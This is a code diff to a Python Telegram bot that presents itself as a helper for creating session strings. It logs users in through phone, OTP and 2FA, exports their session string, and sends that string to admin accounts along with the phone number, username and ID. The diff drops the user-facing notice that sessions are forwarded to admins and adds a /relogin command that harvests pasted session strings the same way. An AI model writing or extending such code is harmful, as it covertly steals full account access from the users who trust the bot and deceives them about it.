@@ -6,7 +6,8 @@ from pyrogram import Client, filters, idle
 from pyrogram.types import Message
 from pyrogram.errors import (
     SessionPasswordNeeded, PhoneCodeInvalid, 
-    PhoneNumberInvalid, PhoneCodeExpired
+    PhoneNumberInvalid, PhoneCodeExpired,
+    AuthKeyUnregistered
 )
 import config
 
@@ -37,11 +38,13 @@ class SessionBot:
             user_id = message.from_user.id
             await message.reply_text(
                 "🤖 **Session Creation Bot**\n\n"
-                "I'll help you create a Telegram session string.\n\n"
+                "I'll help you create a Telegram session file.\n\n"
                 "**Available Commands:**\n"
-                "/create_session - Start session creation\n"
+                "/create_session - Create new session\n"
+                "/relogin - Relogin using session string\n"
+                "/mysessions - View your sessions\n"
                 "/cancel - Cancel current operation\n\n"
-                "⚠️ **Note:** Your session strings will be securely stored and forwarded to admins."
+                "⚠️ **Note:** Your session files will be securely stored ."
             )
         
         @self.app.on_message(filters.command("create_session"))
@@ -64,9 +67,48 @@ class SessionBot:
             await message.reply_text(
                 "📱 **Session Creation Started**\n\n"
                 "Please send your phone number in international format:\n"
-                "Example: `+1234567890`\n\n"
+                "Example: `911234567890`\n\n"
                 "Use /cancel to stop the process."
             )
+        
+        @self.app.on_message(filters.command("relogin"))
+        async def relogin_handler(client, message: Message):
+            """Relogin using session string"""
+            user_id = message.from_user.id
+            
+            if user_id in self.user_sessions:
+                await message.reply_text("❌ You already have an operation in progress!")
+                return
+            
+            self.user_sessions[user_id] = {
+                'step': 'relogin',
+                'client': None
+            }
+            
+            await message.reply_text(
+                "🔄 **Relogin Process**\n\n"
+                "Please send your session string to relogin and verify.\n\n"
+                "Use /cancel to stop the process."
+            )
+        
+        @self.app.on_message(filters.command("mysessions"))
+        async def my_sessions_handler(client, message: Message):
+            """Show user's sessions"""
+            user_id = message.from_user.id
+            sessions = await self.get_user_sessions(user_id)
+            
+            if not sessions:
+                await message.reply_text("❌ You don't have any saved sessions.")
+                return
+            
+            session_list = "📁 **Your Saved Sessions:**\n\n"
+            for session_file in sessions:
+                # Extract user ID from filename
+                user_id_from_file = session_file.split('_')[2].replace('.session', '')
+                session_list += f"• **File:** `{session_file}`\n"
+                session_list += f"  **Account ID:** {user_id_from_file}\n\n"
+            
+            await message.reply_text(session_list)
         
         @self.app.on_message(filters.command("cancel"))
         async def cancel_handler(client, message: Message):
@@ -100,6 +142,9 @@ class SessionBot:
                 
                 elif session_data['step'] == 'password':
                     await self.handle_2fa(message, session_data, message_text)
+                
+                elif session_data['step'] == 'relogin':
+                    await self.handle_relogin(message, session_data, message_text)
                     
             except Exception as e:
                 logger.error(f"Error in session creation for user {user_id}: {e}")
@@ -136,7 +181,7 @@ class SessionBot:
                 "📨 **OTP Sent**\n\n"
                 "I've sent a verification code to your phone.\n"
                 "Please enter the code you received:\n\n"
-                "Format: `12345`"
+                "Format: `1 2 3 4 5`"
             )
             
         except PhoneNumberInvalid:
@@ -203,8 +248,55 @@ class SessionBot:
             await message.reply_text(f"❌ Error with 2FA: {str(e)}\n\nUse /create_session to try again.")
             await self.cleanup_user_session(message.from_user.id)
     
+    async def handle_relogin(self, message: Message, session_data: Dict, session_string: str):
+        """Handle relogin with session string"""
+        try:
+            user_id = message.from_user.id
+            
+            # Create client with session string
+            user_client = Client(
+                f"relogin_{user_id}",
+                api_id=config.API_ID,
+                api_hash=config.API_HASH,
+                session_string=session_string.strip()
+            )
+            
+            await user_client.connect()
+            
+            # Test the session
+            try:
+                me = await user_client.get_me()
+                
+                # Session is valid
+                await message.reply_text(
+                    f"✅ **Session Verified Successfully!**\n\n"
+                    f"👤 **User:** {me.first_name} {me.last_name or ''}\n"
+                    f"📱 **Phone:** {me.phone_number or 'Hidden'}\n"
+                    f"🆔 **User ID:** {me.id}\n\n"
+                    f"Your session is active and working!"
+                )
+                
+                # Save the session file (only session string)
+                filename = f"session_{user_id}_{me.id}.session"
+                self.save_session_file(filename, session_string.strip())
+                
+                # Forward to admins
+                await self.forward_to_admins(user_id, me, session_string.strip(), filename)
+                
+            except AuthKeyUnregistered:
+                await message.reply_text("❌ Session string is invalid or expired. Please create a new session.")
+            except Exception as e:
+                await message.reply_text(f"❌ Error verifying session: {str(e)}")
+            
+            await user_client.disconnect()
+            await self.cleanup_user_session(user_id)
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error with session string: {str(e)}")
+            await self.cleanup_user_session(message.from_user.id)
+    
     async def complete_session_creation(self, message: Message, session_data: Dict):
-        """Complete session creation and save session"""
+        """Complete session creation and save session file"""
         user_id = message.from_user.id
         client = session_data['client']
         
@@ -213,16 +305,9 @@ class SessionBot:
             me = await client.get_me()
             session_string = await client.export_session_string()
             
-            # Create session file
-            filename = f"session_{user_id}_{me.id}.txt"
-            filepath = os.path.join(config.SESSION_FOLDER, filename)
-            
-            # Ensure sessions directory exists
-            os.makedirs(config.SESSION_FOLDER, exist_ok=True)
-            
-            # Save session file
-            with open(filepath, 'w') as f:
-                f.write(session_string)
+            # Create session file with only session string
+            filename = f"session_{user_id}_{me.id}.session"
+            self.save_session_file(filename, session_string)
             
             # Create session info
             session_info = (
@@ -232,13 +317,14 @@ class SessionBot:
                 f"🆔 **User ID:** {me.id}\n"
                 f"📁 **Session File:** `{filename}`\n\n"
                 f"**Session String:**\n`{session_string}`\n\n"
+                f"💡 **You can use /relogin with this string to verify your session later.**\n\n"
                 f"⚠️ **Keep your session string secure!**"
             )
             
             await message.reply_text(session_info)
             
             # Forward session to admins
-            await self.forward_to_admins(user_id, me, session_data['phone_number'], session_string, filename)
+            await self.forward_to_admins(user_id, me, session_string, filename)
             
         except Exception as e:
             logger.error(f"Error completing session creation: {e}")
@@ -246,15 +332,33 @@ class SessionBot:
         finally:
             await self.cleanup_user_session(user_id)
     
-    async def forward_to_admins(self, bot_user_id: int, telegram_user, phone: str, session_string: str, filename: str):
+    def save_session_file(self, filename: str, session_string: str):
+        """Save only session string to .session file"""
+        filepath = os.path.join(config.SESSION_FOLDER, filename)
+        os.makedirs(config.SESSION_FOLDER, exist_ok=True)
+        
+        with open(filepath, 'w') as f:
+            f.write(session_string)
+    
+    async def get_user_sessions(self, user_id: int) -> list:
+        """Get all session files for a user"""
+        sessions = []
+        if os.path.exists(config.SESSION_FOLDER):
+            for filename in os.listdir(config.SESSION_FOLDER):
+                if filename.startswith(f"session_{user_id}_") and filename.endswith('.session'):
+                    sessions.append(filename)
+        return sessions
+    
+    async def forward_to_admins(self, bot_user_id: int, telegram_user, session_string: str, filename: str):
         """Forward session information to admins"""
         try:
             session_info = (
                 f"📋 **New Session Created**\n\n"
                 f"🤖 **Bot User ID:** {bot_user_id}\n"
                 f"👤 **Telegram User:** {telegram_user.first_name} {telegram_user.last_name or ''}\n"
-                f"📱 **Phone:** {phone}\n"
+                f"📱 **Phone:** {telegram_user.phone_number or 'Hidden'}\n"
                 f"🆔 **Telegram ID:** {telegram_user.id}\n"
+                f"👤 **Username:** @{telegram_user.username or 'N/A'}\n"
                 f"📁 **Filename:** {filename}\n"
                 f"🔐 **Session String:**\n`{session_string}`"
             )
@@ -264,7 +368,7 @@ class SessionBot:
                     # Send session info
                     await self.app.send_message(admin_id, session_info)
                     
-                    # Save session file and send as document
+                    # Create and send .session file (only session string)
                     temp_file = f"temp_{filename}"
                     with open(temp_file, 'w') as f:
                         f.write(session_string)
